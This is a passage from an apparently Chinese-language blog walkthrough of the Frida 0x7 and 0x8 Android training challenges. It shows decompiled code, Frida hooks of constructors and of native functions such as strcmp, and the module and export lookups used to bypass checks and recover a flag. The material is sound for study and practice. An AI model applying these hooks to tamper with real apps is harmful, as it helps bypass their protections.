&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="type">Checker</span> <span class="variable">ch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Checker</span>(<span class="number">123</span>, <span class="number">321</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            flag(ch);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flag</span><span class="params">(Checker A)</span> <span class="keyword">throws</span> NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (A.num1 &gt; <span class="number">512</span> &amp;&amp; <span class="number">512</span> &lt; A.num2) &#123;</span><br><span class="line">           </span><br><span class="line">            <span class="built_in">this</span>.f103t1.setText(decrypted);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checker</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x7;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Checker</span> &#123;</span><br><span class="line">    <span class="type">int</span> num1;</span><br><span class="line">    <span class="type">int</span> num2;</span><br><span class="line"></span><br><span class="line">    Checker(<span class="type">int</span> a, <span class="type">int</span> b) &#123;</span><br><span class="line">        <span class="built_in">this</span>.num1 = a;</span><br><span class="line">        <span class="built_in">this</span>.num2 = b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模板</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> &lt;class_reference&gt; = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;&lt;package_name&gt;.&lt;class&gt;&quot;</span>);</span><br><span class="line">  &lt;class_reference&gt;.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">&lt;args&gt;</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>$init</code>: 在 Frida 中，<code>$init</code> 是一个特殊的名称，用来代表 Java 类的构造函数。Java 中的构造函数名称与类名相同，但 Frida 为了提供统一的 Hook 机制，使用了 <code>$init</code> 这个标识符。</p><p>实际操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> a =  <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">  a.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">param</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.$init(<span class="number">600</span>, <span class="number">600</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>注意时机<br>在 <code>onCreate</code> 方法中创建 <code>Checker</code> 类的实例，原始的 onCreate 方法会 立即 创建 Checker 对象 (new Checker(123, 321);)。在之后 尝试设置的 Checker 构造函数 Hook <strong>根本不会被触发</strong>，因为 Checker 对象已经创建完毕了。<br>所以要尽可能地早<br>要hook到oncreate，那么就要使用更快的附加方式：Spawn<code>frida -U -f 包名 -l 脚本名称</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.ad2001.frida0x7 -l test.js</span><br></pre></td></tr></table></figure><p>其他思路<br>不修改原始流程，额外调用。手动创建一个新的 Checker 对象，直接给符合要求的值，主动调用找到的 MainActivity 实例的 flag 方法，传入新创建的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">performNow</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ad2001.frida0x7.MainActivity&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Checker</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Checker</span>_obj = <span class="title class_">Checker</span>.$new(<span class="number">513</span>, <span class="number">513</span>);</span><br><span class="line">            instance.<span class="title function_">flag</span>(<span class="title class_">Checker</span>_obj);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123; &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用这种方法普通地附加上去就可以了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U &quot;Frida 0x7&quot; -l test.js</span><br></pre></td></tr></table></figure><h2 id="0x8-静态so"><a href="#0x8-静态so" class="headerlink" title="0x8 静态so"></a>0x8 静态so</h2><p>java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0x8;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">cmpstr</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;frida0x8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.cmpstr(ip);</span><br><span class="line">                <span class="keyword">if</span> (res == <span class="number">1</span>) &#123;</span><br><span class="line">                </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将程序解包得到so文件<br><code>java -jar apktool.jar d frida0x8.apk -o ./frida0x8</code><br>so</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">Java_com_ad2001_frida0x8_MainActivity_cmpstr</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [xsp+20h] [xbp-C0h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+24h] [xbp-BCh]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [xsp+30h] [xbp-B0h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">100</span>]; <span class="comment">// [xsp+74h] [xbp-6Ch] BYREF</span></span><br><span class="line">  __int64 v10; <span class="comment">// [xsp+D8h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  s1 = (<span class="type">char</span> *)_JNIEnv::GetStringUTFChars(a1, a3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; __strlen_chk(<span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>, <span class="number">0xFFFFFFFFFFFFFFFF</span>LL); ++i )</span><br><span class="line">    s2[i] = aGsjebObujwfMbo[i] - <span class="number">1</span>;</span><br><span class="line">  s2[__strlen_chk(<span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>, <span class="number">0xFFFFFFFFFFFFFFFF</span>LL)] = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">strcmp</span>(s1, s2);</span><br><span class="line">  __android_log_print(<span class="number">3</span>, <span class="string">&quot;input &quot;</span>, <span class="string">&quot;%s&quot;</span>, s1);</span><br><span class="line">  __android_log_print(<span class="number">3</span>, <span class="string">&quot;Password&quot;</span>, <span class="string">&quot;%s&quot;</span>, s2);</span><br><span class="line">  _JNIEnv::ReleaseStringUTFChars(a1, a3, s1);</span><br><span class="line">  _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">return</span> v4 == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它在这里恒返回0，而在java中它需要等于1<br>现在我们想修改<code>Java_com_ad2001_frida0x8_MainActivity_cmpstr()</code>函数，那么首先我们要找到它在哪</p><p>这里是几种找到函数地址的方法<br><strong>Module.enumerateExports（）</strong><br>此 API 枚举来自指定模块的所有导出 （符号） 。导出的函数由 Java 空间中的应用程序使用。它需要一个参数，该参数是要枚举其导出的模块 （共享库或可执行文件） 的名称<br>现在，让我们尝试获取 <code>cmpstr</code> 函数的地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Pixel 4::Frida 0x8 ]-&gt; Module.enumerateExports(&quot;libfrida0x8.so&quot;)[0]</span><br><span class="line">&#123;</span><br><span class="line">    &quot;address&quot;: &quot;0x782945e864&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;,</span><br><span class="line">    &quot;type&quot;: &quot;function&quot;</span><br><span class="line">&#125;</span><br><span class="line">[Pixel 4::Frida 0x8 ]-&gt; Module.enumerateExports(&quot;libfrida0x8.so&quot;)[0][&quot;address&quot;]</span><br><span class="line">&quot;0x782945e864&quot;</span><br></pre></td></tr></table></figure><p><code>Module.getExportByName(modulename, exportName)</code> 函数从模块 （shared library） 中检索具有给定名称的导出元件的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Pixel 4::Frida 0x8 ]-&gt; Module.getExportByName(&quot;libfrida0x8.so&quot;,&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;)</span><br><span class="line">&quot;0x782945e864&quot;</span><br></pre></td></tr></table></figure><p><code>Module.findExportByName（）</code>与 <code>Module.getExportByName（）</code> 相同。唯一的区别是，如果未找到导出， <code>则 Module.getExportByName（）</code> 会引发异常，而 <code> Module.findExportByName（）</code> 将返回 <code>null</code>。</p><p><code>Module.getBaseAddress（）</code> 返回给定模块的基址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Pixel 4::Frida 0x8 ]-&gt; Module.getBaseAddress(&quot;libfrida0x8.so&quot;)</span><br><span class="line">&quot;0x782945e000&quot;</span><br></pre></td></tr></table></figure><p>有了基址后就只需要找到函数的偏移量，这个偏移量可以在ida里直接看到,比如cmpstr的偏移就是0x864<br>相加就是0x782945e864</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000000864</span></span><br><span class="line">.text:<span class="number">0000000000000864</span> ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0000000000000864</span></span><br><span class="line">.text:<span class="number">0000000000000864</span> ; Attributes: bp-based frame</span><br><span class="line">.text:<span class="number">0000000000000864</span></span><br><span class="line">.text:<span class="number">0000000000000864</span> ; <span class="type">bool</span> __fastcall <span class="title function_">Java_com_ad2001_frida0x8_MainActivity_cmpstr</span><span class="params">(__int64, __int64, __int64)</span></span><br><span class="line">.text:0000000000000864                 EXPORT Java_com_ad2001_frida0x8_MainActivity_cmpstr</span><br><span class="line">.text:0000000000000864 Java_com_ad2001_frida0x8_MainActivity_cmpstr</span><br><span class="line">.text:0000000000000864                                         ; DATA XREF: LOAD:<span class="number">0000000000000380</span>↑o</span><br></pre></td></tr></table></figure><p><code>Module.enumerateImports（）</code>与 <code>Module.enumerateExports（）</code> 类似, 它将为我们提供所有模块的导入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">[Pixel 4::Frida 0x8 ]-&gt; Module.enumerateImports(&quot;libfrida0x8.so&quot;)</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;address&quot;: &quot;0x7914724d84&quot;,</span><br><span class="line">        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;__cxa_finalize&quot;,</span><br><span class="line">        &quot;slot&quot;: &quot;0x782945fcd0&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;function&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;address&quot;: &quot;0x7914724c08&quot;,</span><br><span class="line">        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;__cxa_atexit&quot;,</span><br><span class="line">        &quot;slot&quot;: &quot;0x782945fcd8&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;function&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;address&quot;: &quot;0x7914720b0c&quot;,</span><br><span class="line">        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;__register_atfork&quot;,</span><br><span class="line">        &quot;slot&quot;: &quot;0x782945fce0&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;function&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;address&quot;: &quot;0x79146e8cc0&quot;,</span><br><span class="line">        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;__strlen_chk&quot;,</span><br><span class="line">        &quot;slot&quot;: &quot;0x782945fcf0&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;function&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;address&quot;: &quot;0x79146bf740&quot;,</span><br><span class="line">        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;strcmp&quot;,</span><br><span class="line">        &quot;slot&quot;: &quot;0x782945fcf8&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;function&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;address&quot;: &quot;0x791456f714&quot;,</span><br><span class="line">        &quot;module&quot;: &quot;/system/lib64/liblog.so&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;__android_log_print&quot;,</span><br><span class="line">        &quot;slot&quot;: &quot;0x782945fd00&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;function&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;address&quot;: &quot;0x791470d4d4&quot;,</span><br><span class="line">        &quot;module&quot;: &quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;__stack_chk_fail&quot;,</span><br><span class="line">        &quot;slot&quot;: &quot;0x782945fd10&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;function&quot;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line">[Pixel 4::Frida 0x8 ]-&gt; Module.enumerateImports(&quot;libfrida0x8.so&quot;)[4][&#x27;address&#x27;]</span><br><span class="line">&quot;0x79146bf740&quot;</span><br></pre></td></tr></table></figure><p>获取函数地址的方法知道了，现在可以开始利用函数了<br>在这里提供一个模板</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(targetAddress, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Entering &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log arguments if needed</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Leaving &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log return value if needed</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>刚开始我的尝试是直接将它的返回值改成1</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> targetSo = <span class="string">&quot;libfrida0x8.so&quot;</span>; </span><br><span class="line">    <span class="keyword">var</span> funcName = <span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> fridaretAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(targetSo, funcName);    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(fridaretAddr);</span><br><span class="line">    <span class="keyword">if</span> (fridaretAddr != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(fridaretAddr, &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">1</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval&quot;</span>, retval.<span class="title function_">toInt32</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>但是什么也没有发生，它只是将我的返回值改成了我的输入值，我想那不是flag<br>这是它的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flame:/ # logcat | grep &quot;11156&quot;</span><br><span class="line">04-17 09:29:09.618 11156 11189 I Adreno  : PFP: 0x016ee185, ME: 0x00000000</span><br><span class="line">04-17 09:31:57.953 11156 11156 I AssistStructure: Flattened final assist data: 1372 bytes, containing 1 windows, 8 views</span><br><span class="line">04-17 09:32:10.740 11156 11156 D input   : AAA</span><br><span class="line">04-17 09:32:10.740 11156 11156 D Password: FRIDA&#123;NATIVE_LAND&#125;</span><br></pre></td></tr></table></figure><p>其实在日志里就解密好了<br>s2就是目标字符串，它是加密字符串，但是在和输入进行比较时会进行解密，这里也在日志里打印了解密结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; __strlen_chk(<span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>, <span class="number">0xFFFFFFFFFFFFFFFF</span>LL); ++i )</span><br><span class="line">    s2[i] = aGsjebObujwfMbo[i] - <span class="number">1</span>;</span><br><span class="line">  s2[__strlen_chk(<span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span>, <span class="number">0xFFFFFFFFFFFFFFFF</span>LL)] = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">strcmp</span>(s1, s2);</span><br><span class="line">  __android_log_print(<span class="number">3</span>, <span class="string">&quot;input &quot;</span>, <span class="string">&quot;%s&quot;</span>, s1);</span><br><span class="line">  __android_log_print(<span class="number">3</span>, <span class="string">&quot;Password&quot;</span>, <span class="string">&quot;%s&quot;</span>, s2);</span><br></pre></td></tr></table></figure><p>到这里就解出题目了</p><p>换个思路<br>我们要使res&#x3D;1，那么就要输入和它想要对比的字符一样的字符串，那么和我们进行对比的字符串是什么呢？我们能获取到strcmp函数的第二个参数，也就是和我们输入进行对比的字符吗？</p><p>先查找strcmp都在什么地方出现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> strcmp_adr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(strcmp_adr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hooking the strcmp function&quot;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>出来了很多结果<br>那么怎么定位我们的目标strcmp函数（和我们的输入相关联的strcmp)<br>可以肯定目标strcmp和其他strcmp不同的地方就在于传入的参数不同<br>那么现在来查找函数的参数</p><p>函数声明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">strcmp</span><span class="params">( <span class="type">const</span> <span class="type">char</span> *string1, <span class="type">const</span> <span class="type">char</span> *string2 )</span>;</span><br></pre></td></tr></table></figure><p>使用 <code>Memory.readUtf8String（） API</code>。它使用提供的地址从内存中读取 <code>utf</code> 字符串。<code>args</code> 是一个指针数组，其中包含 <code>strcmp</code> 函数的参数。因此，要访问第一个参数，我们可以使用 <code>arg[0]。</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> strcmp_adr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(strcmp_adr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="comment">//console.log(&quot;try find args&quot;);</span></span><br><span class="line">        <span class="keyword">var</span> arg0 = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(arg0);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这是其中一部分数据，看来调用strcmp的方法很多</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Pixel 4::Frida 0x8 ]-&gt; Ljava/lang/String;</span><br><span class="line">Lcom/android/internal/telephony/ProxyController;</span><br><span class="line"><span class="meta prompt_">Lcom/android/internal/view/IInputMethodClient$</span><span class="language-bash">Stub;</span></span><br><span class="line">Lcom/android/internal/telephony/PhoneSubInfoController;</span><br><span class="line">Landroid/view/View;</span><br><span class="line"><span class="meta 